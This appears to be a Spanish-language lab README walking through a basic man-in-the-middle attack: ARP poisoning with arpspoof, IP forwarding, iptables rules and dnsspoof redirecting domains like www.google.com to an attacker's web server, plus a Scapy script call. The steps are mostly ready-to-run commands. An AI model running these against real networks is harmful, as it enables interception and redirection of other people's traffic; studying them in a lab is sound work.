## MITM básico

0. Instalar DSniff. En sistemas basados en Debian: `apt-get install dsniff`

1. Envenenamiento de tablas ARP entre gateway y víctima.

```sh
$ arpspoof -i <interfaz_red> -t <gateway> <víctima>
# arpspoof -i eth0 -t 192.168.1.1 192.168.1.195
```

2. Envenenamiento de tablas ARP entre víctima y gateway

```sh
$ arpspoof -i <interfaz_red> -t <víctima> <gateway>
# arpspoof -i eth0 -t 192.168.1.195 192.168.1.1
```
    
Con los pasos anteriores, se envenenarán las tablas ARP en el gateway y en la víctima. Todos los paquetes intercambiados entre ambas máquinas pasarán primero por la interfaz de red del atacante. Esto, ya es un ataque de MITM.

3. El sistema del atacante debe actuar como una pasarela de los paquetes, de lo contrario se producirá una condición DoS. En sistemas Linux, basta con establecer el ordenador como "forwarder" de la siguiente forma:

```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Hasta este punto, tenemos un ataque de ARP Spoofing/Poisoning funcional. A continuación, ataque de DNS Spoofing.

4. Ejecutar el fichero [iptables-rules.sh](./iptables-rules.sh). Sustituir la dirección IP que corresponda al atacante.

5. Ejecutar `dnspoof` con un fichero de dominios (por ejemplo [domains.txt](./domains.txt)).

6. Para efectos de pruebas, iniciar un servidor web en el puerto 80 en la máquina local (atacante).

```sh
# Por ejemplo, utilizando Twisted
$ sudo twistd -n web --path . --port 80
```

7. Ahora se lanza el ataque de DNS Spoofing utilizando la herramienta dnsspoof

```sh
$ sudo dnsspoof -i eth0 -f domains.txt
```

8. Finalmente, en el ordenador de la víctima, ejecutar el comando `arp`, y utilizando un navegador web, 
navegar por cualquiera de los dominios definidos en el fichero [domains.txt](./domains.txt). Dominios tales como www.google.com serán resueltos con la dirección IP del atacante, y en consecuencia, se servirán los contenidos definidos en el servidor web definido en el ordenador del atacante.

9. Esto mismo, se puede llevar a cabo utilizando Python y Scapy

```sh
$ python mitm.py -t <objetivo> -g <gateway> -i eth0
```
